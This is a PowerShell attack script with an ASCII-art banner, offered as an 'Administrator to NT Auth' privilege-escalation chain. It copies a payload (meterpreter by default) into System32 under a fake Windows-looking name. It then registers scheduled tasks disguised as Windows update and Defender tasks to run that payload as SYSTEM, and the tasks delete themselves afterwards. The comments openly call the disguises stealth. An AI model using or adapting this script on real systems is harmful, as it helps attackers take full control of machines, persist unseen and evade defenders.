<#
 ┓      ┓       ┓  ┓   
┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
           ┛          ┛
┳┓┏┓┓┏┏┓┏┓┓┏┓          
┃┃ ┫┣┫┣┫┃ ┃┫           
┻┛┗┛┛┗┛┗┗┛┛┗┛          

 .S       S.    .S_SSSs      sSSs   .S_SsS_S.    .S_SSSs    
.SS       SS.  .SS~SSSSS    d%%SP  .SS~S*S~SS.  .SS~SSSSS   
S%S       S%S  S%S   SSSS  d%S'    S%S `Y' S%S  S%S   SSSS  
S%S       S%S  S%S    S%S  S%S     S%S     S%S  S%S    S%S  
S&S       S&S  S%S SSSS%S  S&S     S%S     S%S  S%S SSSS%P  
S&S       S&S  S&S  SSS%S  S&S     S&S     S&S   &SSSSSSY   
S&S       S&S  S&S    S&S  S&S     S&S     S&S  S&S    S&S  
S&S       S&S  S&S    S&S  S&S     S&S     S&S  S&S    S&S  
S*b       d*S  S*S    S&S  S*b     S*S     S*S  S*S    S&S  
S*S.     .S*S  S*S    S*S  S*S.    S*S     S*S  S*S    S*S  
 SSSbs_sdSSS   S*S    S*S   SSSbs  S*S     S*S   *SSSSSSP   
  YSSP~YSSY    SSS    S*S    YSSP  SSS     S*S    *SSSsY    
                      SP                   SP             
                      Y                    Y               
                                                            
  sSSs    sSSs   .S_sSSs     .S    sSSs    sSSs             
 d%%SP   d%%SP  .SS~YS%%b   .SS   d%%SP   d%%SP             
d%S'    d%S'    S%S   `S%b  S%S  d%S'    d%S'               
S%|     S%S     S%S    S%S  S%S  S%S     S%|                
S&S     S&S     S%S    d*S  S&S  S&S     S&S                
Y&Ss    S&S_Ss  S&S   .S*S  S&S  S&S_Ss  Y&Ss               
`S&&S   S&S~SP  S&S_sdSSS   S&S  S&S~SP  `S&&S              
  `S*S  S&S     S&S~YSY%b   S&S  S&S       `S*S             
   l*S  S*b     S*S   `S%b  S*S  S*b        l*S             
  .S*P  S*S.    S*S    S%S  S*S  S*S.      .S*P             
sSS*S    SSSbs  S*S    S&S  S*S   SSSbs  sSS*S              
YSS'      YSSP  S*S    SSS  S*S    YSSP  YSS'               
                SP          SP                              
                Y           Y                               
  

#>

# PowerShell Elevator from Administrator to NT Auth (Bypass Chain)

$payloadSource = "$env:Temp\meterpreter.exe" #It dont have to be meterpreter just be a creative
$payloadDest = "C:\Windows\System32\WindowsMSIPackageContent.exe" #Actually for Stealthy Operations
$task1 = "Windows Routine Update Check" #This is bs name for our payload mover
$task2 = "Windows Defender AMSI Activation" #This is bs name for our payload Starter

# Step 1: Move payload using Task 1
$action1 = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c copy `"$payloadSource`" `"$payloadDest`" && schtasks /Create /RU SYSTEM /SC ONCE /TN $task2 /TR `"cmd.exe /c $payloadDest && schtasks /Delete /TN $task1 /F && schtasks /Delete /TN $task2 /F`" /ST $(Get-Date).AddMinutes(2).ToString('HH:mm')"
$trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
Register-ScheduledTask -Action $action1 -Trigger $trigger1 -TaskName $task1 -Description "Moves payload and sets SYSTEM task"
Write-Host "[+] Task '$task1' created. Wait 1-2 minutes for execution."
